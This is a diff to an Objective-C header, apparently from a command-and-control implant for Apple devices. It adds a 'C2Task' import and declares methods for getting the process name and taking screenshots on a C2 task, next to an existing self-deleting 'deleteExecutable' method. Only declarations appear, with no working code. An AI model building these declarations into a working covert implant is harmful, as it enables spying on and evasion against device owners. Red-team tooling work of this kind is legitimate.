@@ -5,6 +5,10 @@
 #import <sys/sysctl.h>
 #import <UIKit/UIKit.h>
 #include <mach-o/dyld.h>
+// #import <IOKit/IOKitLib.h>
+// #import <CoreGraphics/CoreGraphics.h>
+
+#import "C2Task.h"
 
 @interface SystemInfoHelper : NSObject
 
@@ -17,5 +21,7 @@
 + (NSString *)getOS;
 + (NSString *)getDomain;
 + (BOOL)deleteExecutable;
++ (NSString *)getProcessName;
++ (void)takeScreenshotWithTask:(C2Task *)task;
 
 @end
